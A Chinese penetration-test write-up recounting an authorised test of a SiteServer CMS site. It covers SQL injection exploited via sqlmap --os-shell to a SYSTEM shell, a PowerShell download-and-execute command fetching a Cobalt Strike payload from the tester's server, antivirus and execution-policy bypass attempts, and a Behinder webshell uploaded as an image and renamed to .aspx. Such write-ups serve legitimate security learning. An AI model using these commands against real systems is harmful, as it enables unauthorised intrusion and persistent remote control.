根据授权对某站点进行渗透测试。

### 信息收集：

站点使用vue+aspx+iis8.5搭建。站点登录框有版本号且url栏中存在siteserver字样，因此怀疑是cms搭建的，但未见过该cms，使用谷歌搜索发现该站点是用siteserver
cms搭建的，版本为最新，且网上提供的漏洞在此无法使用，在登录框尝试过注入+弱口令+验证码绕过+未授权之类等等手段之后无果，由于具有测试的账号，干脆因此直接登录站点进行测试。

图示为我从网上查找的登录图片，红框处当时是版本号而非cms提示。

![](https://image.3001.net/images/20210106/1609931577_5ff59b39da900b2bd14c3.png!small)  

### 功能测试：

进入后台之后简单浏览了一下功能，多是一些页面管理的功能，此处不再赘述，本文主要是从注入点切入。

一：对上传点的测试：多处存在上传包括头像，普通doc文件，编辑器上传，经过测试，上传功能均使用白名单进行限制，于是决定放弃上传点，毕竟就算能上传jpg也因为iis版本太高无法解析。（但是我后来看到过一个文章iis8.5竟然用解析漏洞成功了）。

二：在一处“批量整理”功能处，抓包

![](https://image.3001.net/images/20210106/1609931642_5ff59b7a6f4c3178c536a.png!small)![](https://image.3001.net/images/20210106/1609931685_5ff59ba5e1a517398f2a7.png!small)  

  

对搜索点keyword参数进行sql注入测试，发现报错，于是直接复制数据包丢到sqlmap跑。python sqlmap.py -r 1.txt .

![](https://image.3001.net/images/20210106/1609931727_5ff59bcf6ea4b441e602a.png!small)  

结果发现存在堆叠查询，且dba权限，直接使用--os-shell命令开启xp_cmd获得shell.使用whoami命令发现当前权限直接是最高权限NT
AUTHORITY\SYSTEM，开心了，除了这些洞以外再加上其他的点本来收拾收拾本次渗透就到此结束了。

### 进入内网：

但是这么高的权限都到手了，不进一下内网都说不过去，本来想着很简单的事情。

打开vps，启动cs，生成powershell马，os-shell运行，等待上线，结果提示错误：

powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX ((new-object
net.webclient).downloadstring('[http://xxx:port/a](http://xxx/a)'))"

![1609931759_5ff59bef94922f88afd79.png!small?1609931760272](https://image.3001.net/images/20210106/1609931759_5ff59bef94922f88afd79.png!small?1609931760272)

第一是先看一下机器是否可以出网，ping了一下vps和dnslog没问题的，于是尝试使用cmd命令执行powershell：

cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX ((new-object net.webclient).downloadstring('[http://xxx:port/a](http://xxx/a)'))"

发现还是报同样的错，怀疑是引号的问题，于是百度了一下cmd中引号转义使用^ ,结果还是不行。

![1609931825_5ff59c313cf06b05a7005.png!small?1609931825750](https://image.3001.net/images/20210106/1609931825_5ff59c313cf06b05a7005.png!small?1609931825750)

然后旁边的大佬说是不是window server 2012 r2 设置了powershell远程下载执行策略，于是尝试使用Get-ExecutionPolicy 查看，并使用Set-ExecutionPolicy 开启，以下为本机演示（真实环境截图忘记了）：

![1609931843_5ff59c43c1255b10f3ba1.png!small?1609931844748](https://image.3001.net/images/20210106/1609931843_5ff59c43c1255b10f3ba1.png!small?1609931844748)

具体可参考该文章：<https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/>

最终在真实环境成功修改powershell执行策略，再去执行命令还是不行，这个时候突然想到会不会是有杀软在作怪，于是tasklist看了一下，好家伙果然存在360防护（此处也无截图）。

猜测确实是360起了作用，这个时候第一想法就是绕过杀软，之前没有太接触过杀软之类的工具，<http://jackson-t.ca/runtime-exec-payloads.html>，直接在这里面编码了一下powershell 命令，结果也不能用，要不然再去借个马，还要麻烦人家。

这个时候突然想到sqlmap写马来上传文件，但是mssql又没有像mysql一样函数（后来问了大佬sqlmap也可以在os-shell的情况下上传文件（骚操作）），忽然想起来我刚才测试时候多处功能点是有文件上传功能的，虽然是白名单，但是丝毫不影响我丢个图片马上去。说干就干，在头像上传处直接上传冰蝎图片马，bingxie.jpg
.然后在os-shell里面使用copy命令重命名 copy d:\abc\img\bingxie.jpg d:\abc\img\bingxie.aspx.
然后使用冰蝎连接，毫无疑问直接成功上线，完结撒花。

![1609931928_5ff59c981aa1dceb9e08a.png!small?1609931928829](https://image.3001.net/images/20210106/1609931928_5ff59c981aa1dceb9e08a.png!small?1609931928829)

总结：思路要灵活多变。

